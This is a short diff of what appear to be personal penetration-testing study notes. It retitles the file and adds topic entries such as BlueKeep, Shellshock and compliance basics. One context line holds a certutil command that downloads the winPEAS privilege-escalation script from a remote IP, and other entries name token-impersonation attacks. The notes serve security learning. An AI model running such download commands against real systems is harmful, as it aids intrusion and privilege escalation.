@@ -1,5 +1,5 @@
 ---
-title: "T1-27-relevant"
+title: relevant
 tags:
   - fetus
 ---
@@ -144,3 +144,5 @@ certutil -urlcache -f http://10.21.154.145:8084/winPEAS.bat winPEAS.bat
 - bugsbd interview lab (linux)
 - impersonate token attack
 - certutilcd C:
+- **Security Standards & Compliance:** NIST controls basics, ISO 27001 fundamental
+- bluekeep, shellshock
